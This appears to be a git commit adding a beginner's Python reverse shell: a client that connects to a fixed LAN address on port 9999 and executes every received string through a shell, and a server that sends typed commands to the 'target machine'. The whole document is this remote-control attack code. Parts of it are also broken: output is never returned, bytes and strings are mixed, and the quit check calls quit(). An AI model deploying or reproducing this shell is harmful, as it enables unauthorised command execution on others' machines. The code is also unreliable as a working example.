9c605f04aa1d131baa99d44b9bbbd9d3b2b4937c
Szymon Ratajczak <daniel.kruk1@interia.pl>
2018-07-03 20:23:25 +0200

    Add files via upload

---
+++ Shell_One_To_One/Client.py
@@ -0,0 +1,29 @@
+import os
+import socket
+import subprocess
+
+s=socket.socket()
+host='192.168.0.102'
+port=9999
+s.connect((host,port))
+
+#Server decides when is the end
+while True:
+    data=s.recv(1024)
+    if data[:2].decode('utf-8')=='cd':
+        os.chdir(data[3:].decode('utf-8'))
+    if len(data)>0:
+        cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+        output_bytes=cmd.stdout.read()+' '+cmd.stdin.read() + ' ' +cmd.stderr.read()
+        output_string=str(output_bytes+os.getcwd(),'utf-8')
+
+        print(output_string)
+
+
+s.close()
+
+
+
+
+
+
---
+++ Shell_One_To_One/Server.py
@@ -0,0 +1,59 @@
+import socket
+import sys
+
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host=''
+        port =9999
+        s=socket.socket()
+    except socket.error as msg:
+        print('Cannot create socket, something has gone wrong'+str(msg))
+
+
+def bindn_socket():
+    try:
+
+
+        print('Binding socket and port'+str(port))
+        s.bind((host,port))
+        s.listen(5)#be ready for connection, 5 is the maximum number of connections that can be in queue
+    except socket.error as msg:
+        print('Sokcet binding error'+ str(msg))
+        bindn_socket()
+
+
+#Establish connection with client
+def socket_accpet():
+    #conn-actual connection
+    conn,address=s.accept()
+    print('Connection has been establish with IP'+ address[0]+ 'port:'+ str(address[1]))
+    send_command(conn)
+    conn.close()
+
+
+#send commands to target machine
+def send_command(conn):
+    while True:
+        cmd=input()
+        if cmd==quit():
+            conn.close()
+            s.close()
+            sys.exit()
+#str.encode beceause we are working iwth bits and string  so we must be
+#sure that everything is going smoothly
+        if len(str.encode(cmd))>0:
+            conn.send(str.encode(cmd))
+
+
+
+def main():
+    create_socket()
+    bindn_socket()
+    socket_accpet()
+
+
+
+main()
